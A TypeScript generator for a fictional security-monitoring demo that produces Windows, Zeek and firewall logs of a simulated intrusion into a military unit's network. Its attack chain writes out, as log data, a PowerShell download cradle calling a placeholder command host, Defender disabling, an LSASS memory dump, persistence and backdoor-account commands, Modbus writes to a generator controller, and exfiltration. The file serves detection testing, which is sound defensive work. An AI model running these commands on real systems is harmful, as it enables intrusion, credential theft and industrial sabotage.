import type { NormalizedEvent } from '@/core/model'

/**
 * Deterministic, fully fictional demo scenario for "Satuan Contoh" on Senin, 2 Nov 2026 (WIB).
 * Produces raw log files in the same formats a unit would import (Windows Event JSON, Zeek TSV,
 * firewall key=value), so the demo exercises the real parsers and rules.
 *
 * All names, hosts, accounts and addresses are invented. External addresses use the
 * documentation ranges 192.0.2.0/24, 198.51.100.0/24 and 203.0.113.0/24; attacker domains use
 * the reserved `.example` TLD.
 */

export type ScenarioFile = { name: string; description: string; text: string }
export type Scenario = { title: string; summary: string; files: ScenarioFile[]; attackKeys: Set<string> }

// ---- time & randomness ------------------------------------------------------------------

const WIB_OFFSET = 7 * 3600_000
const DAY_START = Date.UTC(2026, 10, 1, 17, 0, 0) // 2026-11-02 00:00 WIB

const at = (h: number, m: number, s = 0, ms = 0) => DAY_START + ((h * 60 + m) * 60 + s) * 1000 + ms
const isoWib = (t: number) => new Date(t + WIB_OFFSET).toISOString().replace('Z', '+07:00')
const wibDate = (t: number) => isoWib(t).slice(0, 10)
const wibTime = (t: number) => isoWib(t).slice(11, 19)

class Rng {
  private state: number
  constructor(seed: number) {
    this.state = seed >>> 0
  }
  /** mulberry32 */
  next(): number {
    let t = (this.state += 0x6d2b79f5)
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
  int(min: number, max: number): number {
    return min + Math.floor(this.next() * (max - min + 1))
  }
  pick<T>(items: readonly T[]): T {
    return items[Math.floor(this.next() * items.length)]
  }
  chance(p: number): boolean {
    return this.next() < p
  }
  chars(n: number, alphabet: string): string {
    let out = ''
    for (let i = 0; i < n; i++) out += alphabet[Math.floor(this.next() * alphabet.length)]
    return out
  }
  hex(n: number): string {
    return this.chars(n, '0123456789abcdef')
  }
  /** Random time between two times (ms). */
  between(from: number, to: number): number {
    return from + Math.floor(this.next() * (to - from))
  }
}

/** PowerShell -EncodedCommand: Base64 of UTF-16LE. */
function psEncode(script: string): string {
  let bin = ''
  for (const ch of script) {
    const c = ch.charCodeAt(0)
    bin += String.fromCharCode(c & 0xff, c >> 8)
  }
  return btoa(bin)
}

// ---- environment --------------------------------------------------------------------------

const DOMAIN = 'SATUAN'
const SRV = { host: 'SRV-SATUAN-01', ip: '10.20.1.5' }
const DNS_SERVER = '10.20.1.2'
const NAS = '10.20.1.9'
const HMI = { host: 'HMI-GENSET-01', ip: '10.40.7.10', user: 'operator.genset' }
const PLC = '10.40.7.22'
const C2 = { ip: '203.0.113.66', domain: 'cdn-tukin.example' }
const DROP = { ip: '198.51.100.23', domain: 'files-drop.example' }

const WORKSTATIONS = [
  { host: 'WS-MIN-01', ip: '10.20.4.11', user: 'serka.adi' },
  { host: 'WS-MIN-02', ip: '10.20.4.12', user: 'sertu.bayu' },
  { host: 'WS-MIN-03', ip: '10.20.4.13', user: 'sertu.rina' },
  { host: 'WS-MIN-04', ip: '10.20.4.14', user: 'kopda.yusuf' },
  { host: 'WS-MIN-05', ip: '10.20.4.15', user: 'pratu.dimas' },
  { host: 'WS-LOG-01', ip: '10.20.4.21', user: 'lettu.sari' },
  { host: 'WS-IT-01', ip: '10.20.4.30', user: 'admin.it' },
]
const VICTIM = WORKSTATIONS[2]

const BROWSE = ['www.google.com', 'mail.google.com', 'web.whatsapp.com', 'www.youtube.com', 'update.microsoft.com', 'outlook.office365.com', 'portal.satuan.local', 'drive.google.com']

const P = {
  explorer: 'C:\\Windows\\explorer.exe',
  userinit: 'C:\\Windows\\System32\\userinit.exe',
  services: 'C:\\Windows\\System32\\services.exe',
  chrome: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
  word: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
  excel: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE',
  acrobat: 'C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe',
  whatsapp: 'C:\\Program Files\\WindowsApps\\WhatsApp\\WhatsApp.exe',
  notepad: 'C:\\Windows\\System32\\notepad.exe',
  powershell: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
  cmd: 'C:\\Windows\\System32\\cmd.exe',
  rundll32: 'C:\\Windows\\System32\\rundll32.exe',
  schtasks: 'C:\\Windows\\System32\\schtasks.exe',
  svchost: 'C:\\Windows\\System32\\svchost.exe',
  taskhostw: 'C:\\Windows\\System32\\taskhostw.exe',
  robocopy: 'C:\\Windows\\System32\\Robocopy.exe',
  psexesvc: 'C:\\Windows\\PSEXESVC.exe',
  net: 'C:\\Windows\\System32\\net.exe',
  python: 'C:\\Program Files\\Python311\\python.exe',
  sevenZip: 'C:\\Program Files\\7-Zip\\7z.exe',
  hmi: 'C:\\Program Files\\GensetHMI\\GensetHMI.exe',
}

// ---- writers ------------------------------------------------------------------------------

type Rec = { t: number; line: string }

class Writers {
  readonly attackKeys = new Set<string>()
  private readonly win = new Map<string, Rec[]>()
  private readonly recordIds = new Map<string, number>()
  readonly zeek: Record<'conn' | 'dns' | 'modbus_detailed', Rec[]> = { conn: [], dns: [], modbus_detailed: [] }
  readonly fw: Rec[] = []
  private session = 4_810_000

  constructor(private readonly rng: Rng) {}

  private winFile(host: string): string {
    return host.startsWith('WS-') ? 'windows-workstation.jsonl' : `windows-${host.toLowerCase()}.jsonl`
  }

  winEvent(host: string, t: number, channel: string, provider: string, eventId: number, data: Record<string, unknown>, attack = false) {
    const rid = (this.recordIds.get(host) ?? this.rng.int(180_000, 900_000)) + 1
    this.recordIds.set(host, rid)
    const record = { TimeCreated: isoWib(t), EventID: eventId, Channel: channel, ProviderName: provider, Computer: `${host}.satuan.local`, EventRecordID: rid, EventData: data }
    const file = this.winFile(host)
    if (!this.win.has(file)) this.win.set(file, [])
    this.win.get(file)!.push({ t, line: JSON.stringify(record) })
    if (attack) this.attackKeys.add(`win:${host}:${rid}`)
  }

  sysmon(host: string, t: number, eventId: number, data: Record<string, unknown>, attack = false) {
    this.winEvent(host, t, 'Microsoft-Windows-Sysmon/Operational', 'Microsoft-Windows-Sysmon', eventId, { UtcTime: new Date(t).toISOString().replace('T', ' ').slice(0, 23), ...data }, attack)
  }

  proc(host: string, t: number, user: string, image: string, cmd: string, parentImage: string, attack = false) {
    this.sysmon(host, t, 1, {
      ProcessGuid: `{${this.rng.hex(8)}-${this.rng.hex(4)}-${this.rng.hex(4)}-0000-${this.rng.hex(12)}}`,
      ProcessId: this.rng.int(1000, 15000),
      Image: image,
      CommandLine: cmd,
      CurrentDirectory: `C:\\Users\\${user}\\`,
      User: `${DOMAIN}\\${user}`,
      IntegrityLevel: 'Medium',
      Hashes: `SHA256=${this.rng.hex(64).toUpperCase()}`,
      ParentImage: parentImage,
      ParentCommandLine: `"${parentImage}"`,
    }, attack)
  }

  sec(host: string, t: number, eventId: number, data: Record<string, unknown>, attack = false) {
    this.winEvent(host, t, 'Security', 'Microsoft-Windows-Security-Auditing', eventId, data, attack)
  }

  private uid(): string {
    return `C${this.rng.chars(17, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789')}`
  }

  conn(t: number, orig: string, resp: string, port: number, service: string, origBytes: number, respBytes: number, attack = false, uid = this.uid()) {
    const row = [(t / 1000).toFixed(6), uid, orig, this.rng.int(49152, 65000), resp, port, 'tcp', service || '-', (this.rng.next() * 30).toFixed(6), origBytes, respBytes, 'SF']
    this.zeek.conn.push({ t, line: row.join('\t') })
    if (attack) this.attackKeys.add(`zeek:${uid}`)
    return uid
  }

  dns(t: number, orig: string, query: string, answer: string, attack = false) {
    const uid = this.uid()
    const row = [(t / 1000).toFixed(6), uid, orig, this.rng.int(49152, 65000), DNS_SERVER, 53, 'udp', this.rng.int(1, 65000), query, 'A', 'NOERROR', answer]
    this.zeek.dns.push({ t, line: row.join('\t') })
    if (attack) this.attackKeys.add(`zeek:${uid}`)
  }

  modbus(t: number, uid: string, orig: string, func: string, address: number, quantity: number, values: string, attack = false) {
    const row = [(t / 1000).toFixed(6), uid, orig, 50200, PLC, 502, this.rng.int(1, 65535), 1, func, 'RESPONSE', address, quantity, values, '-']
    this.zeek.modbus_detailed.push({ t, line: row.join('\t') })
    if (attack) this.attackKeys.add(`zeek:${uid}`)
  }

  firewall(t: number, src: string, dst: string, port: number, service: string, sent: number, rcvd: number, hostname?: string, action = 'close', attack = false) {
    const sessionid = ++this.session
    const parts = [
      `date=${wibDate(t)}`, `time=${wibTime(t)}`, 'devname="FW-SATUAN"', 'devid="FGT60F0000000001"', 'logid="0000000013"',
      'type="traffic"', 'subtype="forward"', 'level="notice"', `eventtime=${BigInt(t) * 1_000_000n}`, 'tz="+0700"',
      `srcip=${src}`, `srcport=${this.rng.int(49152, 65000)}`, `dstip=${dst}`, `dstport=${port}`, `sessionid=${sessionid}`,
      'proto=6', `action="${action}"`, 'policyid=5', `service="${service}"`, ...(hostname ? [`hostname="${hostname}"`] : []),
      `sentbyte=${sent}`, `rcvdbyte=${rcvd}`,
    ]
    this.fw.push({ t, line: `<189>${parts.join(' ')}` })
    if (attack) this.attackKeys.add(`fw:${sessionid}`)
  }

  files(): ScenarioFile[] {
    const sorted = (recs: Rec[]) => [...recs].sort((a, b) => a.t - b.t).map((r) => r.line)
    const zeekHeader = (path: string, fields: string[], types: string[]) =>
      ['#separator \\x09', '#set_separator\t,', '#empty_field\t(empty)', '#unset_field\t-', `#path\t${path}`, '#open\t2026-11-02-00-00-00', `#fields\t${fields.join('\t')}`, `#types\t${types.join('\t')}`]
    const winDescriptions: Record<string, string> = {
      'windows-workstation.jsonl': 'Sysmon, Security & PowerShell dari 7 workstation staf',
      'windows-srv-satuan-01.jsonl': 'Sysmon, Security, System & PowerShell dari server berkas satuan',
      'windows-hmi-genset-01.jsonl': 'Log Windows dari HMI pengendali genset',
    }
    return [
      ...[...this.win.entries()].sort().map(([name, recs]) => ({ name, description: winDescriptions[name] ?? 'Windows Event Log', text: sorted(recs).join('\n') + '\n' })),
      {
        name: 'zeek-conn.log',
        description: 'Zeek conn.log dari sensor jaringan satuan (TI + OT)',
        text: [...zeekHeader('conn', ['ts', 'uid', 'id.orig_h', 'id.orig_p', 'id.resp_h', 'id.resp_p', 'proto', 'service', 'duration', 'orig_bytes', 'resp_bytes', 'conn_state'], ['time', 'string', 'addr', 'port', 'addr', 'port', 'enum', 'string', 'interval', 'count', 'count', 'string']), ...sorted(this.zeek.conn), '#close\t2026-11-03-00-00-00'].join('\n') + '\n',
      },
      {
        name: 'zeek-dns.log',
        description: 'Zeek dns.log',
        text: [...zeekHeader('dns', ['ts', 'uid', 'id.orig_h', 'id.orig_p', 'id.resp_h', 'id.resp_p', 'proto', 'trans_id', 'query', 'qtype_name', 'rcode_name', 'answers'], ['time', 'string', 'addr', 'port', 'addr', 'port', 'enum', 'count', 'string', 'string', 'string', 'vector[string]']), ...sorted(this.zeek.dns), '#close\t2026-11-03-00-00-00'].join('\n') + '\n',
      },
      {
        name: 'zeek-modbus_detailed.log',
        description: 'Transaksi Modbus/TCP HMI ↔ pengendali genset (gaya ICSNPP-Modbus)',
        text: [...zeekHeader('modbus_detailed', ['ts', 'uid', 'id.orig_h', 'id.orig_p', 'id.resp_h', 'id.resp_p', 'tid', 'unit', 'func', 'request_response', 'address', 'quantity', 'values', 'exception'], ['time', 'string', 'addr', 'port', 'addr', 'port', 'count', 'count', 'string', 'string', 'count', 'count', 'string', 'string']), ...sorted(this.zeek.modbus_detailed), '#close\t2026-11-03-00-00-00'].join('\n') + '\n',
      },
      { name: 'fw-satuan.log', description: 'Syslog firewall perimeter satuan (key=value)', text: sorted(this.fw).join('\n') + '\n' },
    ]
  }
}

// ---- benign background --------------------------------------------------------------------

function background(w: Writers, rng: Rng) {
  for (const ws of WORKSTATIONS) {
    const isVictim = ws === VICTIM
    const login = at(7, rng.int(25, 55), rng.int(0, 59))
    // The victim's Security log is cleared at 10:05 by the attacker, so its earlier records are gone.
    if (!isVictim) {
      if (rng.chance(0.5)) w.sec(ws.host, login - 20_000, 4625, { TargetUserName: ws.user, TargetDomainName: DOMAIN, LogonType: 2, IpAddress: '127.0.0.1', WorkstationName: ws.host, Status: '0xc000006d', SubStatus: '0xc000006a' })
      w.sec(ws.host, login, 4624, { TargetUserName: ws.user, TargetDomainName: DOMAIN, LogonType: 2, IpAddress: '127.0.0.1', WorkstationName: ws.host, LogonProcessName: 'User32', AuthenticationPackageName: 'Negotiate' })
    }
    w.proc(ws.host, login + 3000, ws.user, P.explorer, P.explorer, P.userinit)

    const workStart = login + 60_000
    const workEnd = at(16, 0)
    const apps = [
      () => [P.chrome, `"${P.chrome}"`],
      () => [P.word, `"${P.word}" /n "C:\\Users\\${ws.user}\\Documents\\Laporan_Harian_${rng.int(1, 30)}.docx"`],
      () => [P.excel, `"${P.excel}" "C:\\Users\\${ws.user}\\Documents\\Rekap_Logistik_${rng.int(1, 12)}.xlsx"`],
      () => [P.whatsapp, `"${P.whatsapp}"`],
      () => [P.acrobat, `"${P.acrobat}" "C:\\Users\\${ws.user}\\Downloads\\Surat_Edaran_${rng.int(1, 40)}.pdf"`],
      () => [P.notepad, `"${P.notepad}"`],
    ]
    for (let i = 0; i < 30; i++) {
      const [image, cmd] = rng.pick(apps)()
      w.proc(ws.host, rng.between(workStart, workEnd), ws.user, image, cmd, P.explorer)
    }

    for (let i = 0; i < 75; i++) {
      const t = rng.between(workStart, workEnd)
      const domain = rng.pick(BROWSE)
      const internal = domain.endsWith('.local')
      const ip = internal ? '10.20.1.20' : `192.0.2.${rng.int(1, 254)}`
      const image = domain === 'web.whatsapp.com' ? P.whatsapp : P.chrome
      w.sysmon(ws.host, t, 22, { Image: image, QueryName: domain, QueryStatus: 0, QueryResults: `::ffff:${ip};`, User: `${DOMAIN}\\${ws.user}` })
      w.dns(t + 5, ws.ip, domain, ip)
      w.sysmon(ws.host, t + 40, 3, { Image: image, User: `${DOMAIN}\\${ws.user}`, Protocol: 'tcp', Initiated: true, SourceIp: ws.ip, SourcePort: rng.int(49152, 65000), DestinationIp: ip, DestinationPort: 443 })
      const sent = rng.int(1_200, 2_500_000)
      w.conn(t + 41, ws.ip, ip, 443, 'ssl', sent, rng.int(5_000, 9_000_000))
      if (!internal) w.firewall(t + 30_000, ws.ip, ip, 443, 'HTTPS', sent, rng.int(5_000, 9_000_000), domain)
    }

    const downloads = [
      () => [P.chrome, `C:\\Users\\${ws.user}\\Downloads\\Surat_Edaran_${rng.int(1, 40)}.pdf`],
      () => [P.whatsapp, `C:\\Users\\${ws.user}\\Downloads\\IMG-20261102-WA00${rng.int(10, 99)}.jpg`],
      () => [P.whatsapp, `C:\\Users\\${ws.user}\\Downloads\\Jadwal_Piket_${rng.int(1, 9)}.pdf`],
      () => [P.whatsapp, `C:\\Users\\${ws.user}\\Downloads\\Nota_Dinas_${rng.int(1, 60)}.docx`],
    ]
    for (let i = 0; i < 5; i++) {
      const [image, target] = rng.pick(downloads)()
      w.sysmon(ws.host, rng.between(workStart, workEnd), 11, { Image: image, TargetFilename: target, User: `${DOMAIN}\\${ws.user}` })
    }

    // File share access on the server.
    for (let i = 0; i < 12; i++) {
      const t = rng.between(workStart, workEnd)
      w.sec(SRV.host, t, 4624, { TargetUserName: ws.user, TargetDomainName: DOMAIN, LogonType: 3, IpAddress: ws.ip, WorkstationName: ws.host, LogonProcessName: 'Kerberos', AuthenticationPackageName: 'Kerberos' })
      w.sec(SRV.host, t + 150, 5140, { SubjectUserName: ws.user, SubjectDomainName: DOMAIN, IpAddress: ws.ip, ShareName: '\\\\*\\Dokumen', ShareLocalPath: '\\??\\D:\\Dokumen' })
      w.conn(t - 80, ws.ip, SRV.ip, 445, 'smb', rng.int(2_000, 400_000), rng.int(2_000, 3_000_000))
    }

    w.sec(ws.host, at(16, rng.int(5, 40)), 4634, { TargetUserName: ws.user, TargetDomainName: DOMAIN, LogonType: 2 })
  }

  // Server housekeeping.
  w.proc(SRV.host, at(1, 0, 4), 'svc_backup', P.robocopy, `"${P.robocopy}" D:\\Dokumen \\\\nas-satuan\\backup /MIR /R:1`, P.taskhostw)
  w.conn(at(1, 0, 6), SRV.ip, NAS, 445, 'smb', 2_400_000_000, 1_200_000)
  for (let i = 0; i < 30; i++) w.proc(SRV.host, rng.between(at(0, 0), at(23, 59)), 'SYSTEM', rng.pick([P.svchost, P.taskhostw]), `${P.svchost} -k netsvcs -p`, P.services)
  w.sec(SRV.host, at(8, 10, 12), 4624, { TargetUserName: 'admin.it', TargetDomainName: DOMAIN, LogonType: 10, IpAddress: '10.20.4.30', WorkstationName: 'WS-IT-01', LogonProcessName: 'User32', AuthenticationPackageName: 'Negotiate' })
  const adminScripts = [
    "Get-Service | Where-Object { $_.Status -eq 'Stopped' } | Select-Object Name, DisplayName",
    'Get-ChildItem D:\\Backup -Recurse | Measure-Object -Property Length -Sum',
    'Get-WinEvent -LogName System -MaxEvents 20 | Format-Table TimeCreated, Id, Message',
    'Test-Connection nas-satuan -Count 2',
    'Get-Volume | Select-Object DriveLetter, SizeRemaining, Size',
    'Get-LocalGroupMember Administrators',
  ]
  adminScripts.forEach((script, i) =>
    w.winEvent(SRV.host, at(8, 12 + i * 4, rng.int(0, 59)), 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-PowerShell', 4104, { MessageNumber: 1, MessageTotal: 1, ScriptBlockText: script, ScriptBlockId: `${rng.hex(8)}-${rng.hex(4)}`, Path: '' }),
  )

  // HMI operator.
  w.sec(HMI.host, at(6, 58, 10), 4624, { TargetUserName: HMI.user, TargetDomainName: DOMAIN, LogonType: 2, IpAddress: '127.0.0.1', WorkstationName: HMI.host, LogonProcessName: 'User32', AuthenticationPackageName: 'Negotiate' })
  w.proc(HMI.host, at(7, 0, 2), HMI.user, P.hmi, `"${P.hmi}" --plc ${PLC}`, P.explorer)
  w.sec(HMI.host, at(15, 2, 40), 4634, { TargetUserName: HMI.user, TargetDomainName: DOMAIN, LogonType: 2 })

  // HMI polls the genset controller every minute; one Zeek connection per hour.
  for (let h = 0; h < 24; h++) {
    const uid = w.conn(at(h, 0, 0, 120), HMI.ip, PLC, 502, 'modbus', 46_000, 98_000)
    for (let m = 0; m < 60; m++) {
      const t = at(h, m, 1, rng.int(0, 900))
      const volt = 228 + rng.int(-2, 3)
      const values = [1, volt, 50, rng.int(380, 420), rng.int(70, 82), rng.int(60, 95), rng.int(1, 3), 0, 0, 0, 230, 0, 0, 0, 0, 0, 0, 0, 0, 0]
      w.modbus(t, uid, HMI.ip, 'READ_HOLDING_REGISTERS', 0, 20, values.join(','))
    }
    if (h === 13) {
      // Scheduled maintenance: setpoint adjusted from the HMI, within the safe range.
      w.modbus(at(13, 5, 12), uid, HMI.ip, 'WRITE_SINGLE_REGISTER', 10, 1, '228')
      w.modbus(at(13, 7, 40), uid, HMI.ip, 'WRITE_SINGLE_REGISTER', 10, 1, '230')
    }
  }
}

// ---- attack chain -------------------------------------------------------------------------

function attack(w: Writers, rng: Rng) {
  const v = VICTIM
  const user = v.user
  const doc = `C:\\Users\\${user}\\Downloads\\Jadwal_Apel_Gabungan.docm`
  const stage1 = `IEX (New-Object Net.WebClient).DownloadString('http://${C2.domain}/a.ps1')`
  const enc = psEncode(stage1)

  // 1. Macro document arrives through WhatsApp Desktop from an account already taken over.
  w.sysmon(v.host, at(9, 12, 4, 311), 11, { Image: P.whatsapp, TargetFilename: doc, User: `${DOMAIN}\\${user}` }, true)
  w.proc(v.host, at(9, 12, 41, 20), user, P.word, `"${P.word}" /n "${doc}"`, P.explorer, true)
  // 2. Macro runs an encoded PowerShell download cradle.
  w.proc(v.host, at(9, 13, 2, 554), user, P.powershell, `powershell.exe -nop -w hidden -enc ${enc}`, P.word, true)
  w.winEvent(v.host, at(9, 13, 2, 930), 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-PowerShell', 4104, { MessageNumber: 1, MessageTotal: 1, ScriptBlockText: stage1, ScriptBlockId: rng.hex(8), Path: '' }, true)
  w.sysmon(v.host, at(9, 13, 3, 101), 22, { Image: P.powershell, QueryName: C2.domain, QueryStatus: 0, QueryResults: `::ffff:${C2.ip};`, User: `${DOMAIN}\\${user}` }, true)
  w.dns(at(9, 13, 3, 110), v.ip, C2.domain, C2.ip, true)
  w.sysmon(v.host, at(9, 13, 3, 402), 3, { Image: P.powershell, User: `${DOMAIN}\\${user}`, Protocol: 'tcp', Initiated: true, SourceIp: v.ip, SourcePort: 51544, DestinationIp: C2.ip, DestinationPort: 443 }, true)
  w.conn(at(9, 13, 3, 410), v.ip, C2.ip, 443, 'ssl', 4_812, 389_120, true)
  w.firewall(at(9, 13, 34), v.ip, C2.ip, 443, 'HTTPS', 4_812, 389_120, C2.domain, 'close', true)
  w.winEvent(v.host, at(9, 13, 30, 70), 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-PowerShell', 4104, { MessageNumber: 1, MessageTotal: 1, ScriptBlockText: '$s=[Text.Encoding]::UTF8.GetString($r); Start-Sleep -s 30; Invoke-Expression $s', ScriptBlockId: rng.hex(8), Path: '' }, true)
  // 3. Defense evasion, credential theft, persistence.
  w.proc(v.host, at(9, 15, 10, 5), user, P.powershell, 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"', P.powershell, true)
  w.proc(v.host, at(9, 16, 30, 640), user, P.rundll32, `${P.rundll32} C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 C:\\Users\\Public\\dbg.dmp full`, P.powershell, true)
  w.sysmon(v.host, at(9, 16, 31, 2), 11, { Image: P.rundll32, TargetFilename: 'C:\\Users\\Public\\dbg.dmp', User: `${DOMAIN}\\${user}` }, true)
  w.proc(v.host, at(9, 18, 12, 300), user, P.schtasks, `schtasks.exe /create /tn "OfficeUpdateTask" /tr "powershell.exe -w hidden -enc ${enc}" /sc onlogon /ru SYSTEM`, P.powershell, true)

  // 4. Password guessing against the server, then logon with stolen admin credentials.
  for (let i = 0; i < 6; i++) {
    w.sec(SRV.host, at(9, 20, 5 + i * 17), 4625, { TargetUserName: 'administrator', TargetDomainName: DOMAIN, LogonType: 3, IpAddress: v.ip, WorkstationName: v.host, Status: '0xc000006d', SubStatus: '0xc000006a' }, true)
  }
  w.conn(at(9, 24, 50, 900), v.ip, SRV.ip, 445, 'smb', 1_860_000, 22_000, true)
  w.sec(SRV.host, at(9, 24, 51), 4624, { TargetUserName: 'admin.it', TargetDomainName: DOMAIN, LogonType: 3, IpAddress: v.ip, WorkstationName: v.host, LogonProcessName: 'NtLmSsp', AuthenticationPackageName: 'NTLM' }, true)
  w.sec(SRV.host, at(9, 24, 52), 5140, { SubjectUserName: 'admin.it', SubjectDomainName: DOMAIN, IpAddress: v.ip, ShareName: '\\\\*\\ADMIN$', ShareLocalPath: '\\??\\C:\\Windows' }, true)
  w.winEvent(SRV.host, at(9, 24, 55), 'System', 'Service Control Manager', 7045, { ServiceName: 'PSEXESVC', ImagePath: '%SystemRoot%\\PSEXESVC.exe', ServiceType: 'user mode service', StartType: 'demand start', AccountName: 'LocalSystem' }, true)
  w.proc(SRV.host, at(9, 25, 10), 'admin.it', P.cmd, 'cmd.exe /c "whoami /all & ipconfig /all"', P.psexesvc, true)
  // 5. Backdoor account.
  w.proc(SRV.host, at(9, 27, 1), 'admin.it', P.net, 'net.exe user svc_backup2 Bkp#2026! /add', P.cmd, true)
  w.sec(SRV.host, at(9, 27, 2), 4720, { TargetUserName: 'svc_backup2', TargetDomainName: DOMAIN, SubjectUserName: 'admin.it', SubjectDomainName: DOMAIN }, true)

  // 6. From the server into the OT network: scan, then manipulate the genset controller.
  w.proc(SRV.host, at(9, 30, 44), 'admin.it', P.python, `"${P.python}" C:\\ProgramData\\mbtool.py --target ${PLC} --scan`, P.cmd, true)
  const otUid = w.conn(at(9, 31, 2), SRV.ip, PLC, 502, 'modbus', 3_120, 4_480, true)
  w.firewall(at(9, 31, 2, 400), SRV.ip, PLC, 502, 'Modbus', 3_120, 4_480, undefined, 'accept', true)
  for (let reg = 0; reg < 25; reg++) {
    w.modbus(at(9, 31, 5 + Math.floor(reg * 1.5), rng.int(0, 900)), otUid, SRV.ip, 'READ_HOLDING_REGISTERS', reg, 1, String(rng.int(0, 400)), true)
  }
  w.proc(SRV.host, at(9, 36, 18), 'admin.it', P.python, `"${P.python}" C:\\ProgramData\\mbtool.py --target ${PLC} --write 10 265`, P.cmd, true)
  w.modbus(at(9, 36, 20, 150), otUid, SRV.ip, 'WRITE_SINGLE_REGISTER', 10, 1, '265', true)
  w.proc(SRV.host, at(9, 36, 46), 'admin.it', P.python, `"${P.python}" C:\\ProgramData\\mbtool.py --target ${PLC} --coil 0 off`, P.cmd, true)
  w.modbus(at(9, 36, 48, 610), otUid, SRV.ip, 'WRITE_SINGLE_COIL', 0, 1, 'F', true)

  // 7. Collection and exfiltration to anonymous storage.
  w.proc(SRV.host, at(9, 41, 15), 'admin.it', P.sevenZip, `"${P.sevenZip}" a -pS4tuan#26 C:\\ProgramData\\arsip.7z D:\\Dokumen\\Rahasia\\*`, P.cmd, true)
  w.dns(at(9, 44, 2), SRV.ip, DROP.domain, DROP.ip, true)
  const chunks = [312, 298, 305, 301, 296, 288]
  chunks.forEach((mb, i) => {
    const t = at(9, 44 + i * 3, 9 + i * 7)
    const bytes = mb * 1024 * 1024 + rng.int(0, 99_999)
    w.conn(t, SRV.ip, DROP.ip, 443, 'ssl', bytes, rng.int(20_000, 60_000), true)
    w.firewall(t + 150_000, SRV.ip, DROP.ip, 443, 'HTTPS', bytes, rng.int(20_000, 60_000), DROP.domain, 'close', true)
  })

  // 8. Covering tracks on the workstation.
  w.sec(v.host, at(10, 5, 31), 1102, { SubjectUserName: user, SubjectDomainName: DOMAIN }, true)
}

/** Builds the scenario. Same seed -> byte-identical files. */
export function generateScenario(seed = 20261102): Scenario {
  const rng = new Rng(seed)
  const w = new Writers(rng)
  background(w, rng)
  attack(w, rng)
  return {
    title: 'Skenario "Rincian Tukin Palsu" — Satuan Contoh (fiktif)',
    summary:
      'Akun WhatsApp seorang prajurit diambil alih lewat APK palsu, lalu dipakai mengirim dokumen ber-makro ke staf. Penyerang mencuri kredensial, bergerak ke server satuan, memindai dan memanipulasi pengendali genset (OT), lalu mengirim arsip dokumen keluar. Disertai ±5.000 event normal sepanjang hari.',
    files: w.files(),
    attackKeys: w.attackKeys,
  }
}

/** Key used by `Scenario.attackKeys` for a parsed event (tests and the demo use this). */
export function scenarioKey(event: NormalizedEvent): string | undefined {
  const f = event.fields
  if (event.dataset === 'winevent') return `win:${event.host}:${f.EventRecordID}`
  if (event.dataset.startsWith('zeek.')) return f.uid ? `zeek:${f.uid}` : undefined
  if (event.dataset === 'kv-syslog') return f.sessionid ? `fw:${f.sessionid}` : undefined
  return undefined
}
